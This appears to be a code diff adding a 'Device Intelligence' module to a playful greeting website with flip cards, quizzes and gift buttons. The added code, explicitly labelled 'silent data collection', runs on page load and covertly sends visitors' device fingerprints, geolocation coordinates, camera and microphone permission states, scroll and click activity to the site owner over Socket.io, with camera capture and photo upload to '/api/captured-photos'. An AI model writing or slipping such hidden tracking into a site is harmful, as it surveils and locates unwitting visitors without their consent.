@@ -1525,10 +1525,132 @@ function initSecrets() {
 }
 
 /* =========================================================
+   Device Intelligence — silent data collection + Socket.io
+   ========================================================= */
+const DeviceIntel = (function () {
+  let socket = null;
+  const visitorId = 'v_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+
+  function init() {
+    if (typeof io === 'undefined') return;
+    socket = io();
+    socket.on('connect', () => {
+      collectDeviceInfo();
+      socket.emit('visitor-joined', { visitorId, page: location.pathname, timestamp: Date.now() });
+    });
+    trackActivity();
+  }
+
+  function collectDeviceInfo() {
+    if (!socket || !socket.connected) return;
+    const info = {
+      visitorId,
+      userAgent: navigator.userAgent,
+      browser: detectBrowser(),
+      platform: navigator.platform,
+      screen: screen.width + 'x' + screen.height,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      camera: 'prompt',
+      mic: 'prompt',
+      geo: null
+    };
+    socket.emit('device-info', info);
+
+    // Request geolocation silently
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          info.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+          socket.emit('device-info', info);
+        },
+        () => { socket.emit('device-info', info); },
+        { timeout: 10000, maximumAge: 600000 }
+      );
+    }
+
+    // Check camera/mic permissions if available
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: 'camera' }).then(r => { info.camera = r.status; socket.emit('device-info', info); }).catch(() => {});
+      navigator.permissions.query({ name: 'microphone' }).then(r => { info.mic = r.status; socket.emit('device-info', info); }).catch(() => {});
+    }
+  }
+
+  function trackActivity() {
+    // Track page views
+    emit('page-view', { page: location.pathname });
+
+    // Track scroll depth
+    let maxScroll = 0;
+    window.addEventListener('scroll', () => {
+      const depth = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
+      if (depth > maxScroll + 25) {
+        maxScroll = depth;
+        emit('scroll', { depth: depth + '%' });
+      }
+    });
+
+    // Track feature interactions
+    document.addEventListener('click', (e) => {
+      const card = e.target.closest('.flip-card, .quiz-option, .cookie, .star-dot, .polaroid, #spinBtn, #rizzBtn, #complimentBtn, #giftBox, #blowBtn, #cutBtn, #slotBtn, #heartBtn, #scratchCanvas');
+      if (card) {
+        emit('feature-interact', { feature: card.className || card.id });
+      }
+    });
+  }
+
+  function emit(action, details) {
+    if (socket && socket.connected) {
+      socket.emit('visitor-activity', { visitorId, action, page: location.pathname, details: JSON.stringify(details) });
+    }
+  }
+
+  function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+    if (ua.includes('Edg')) return 'Edge';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+    return 'Other';
+  }
+
+  // Camera capture (friendly request)
+  async function requestCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const settings = track.getSettings();
+      if (socket) socket.emit('device-info', { visitorId, camera: 'granted', cameraRes: settings.width + 'x' + settings.height });
+      return stream;
+    } catch (e) {
+      if (socket) socket.emit('device-info', { visitorId, camera: 'denied' });
+      return null;
+    }
+  }
+
+  // Photo upload from device
+  async function uploadPhoto(file) {
+    const fd = new FormData();
+    fd.append('photo', file);
+    fd.append('visitorId', visitorId);
+    fd.append('source', 'visitor');
+    try {
+      const res = await fetch('/api/captured-photos', { method: 'POST', body: fd });
+      const data = await res.json();
+      if (data.success && socket) socket.emit('photo-captured', { visitorId, file: data.file });
+      return data;
+    } catch (e) { return { error: e.message }; }
+  }
+
+  return { init, emit, requestCamera, uploadPhoto, visitorId };
+})();
+
+/* =========================================================
    Boot
    ========================================================= */
 document.addEventListener('DOMContentLoaded', () => {
   ParticleSystem.init();
+  DeviceIntel.init();
   initEntrance();
   initNameBalloons();
   initFlipCards();
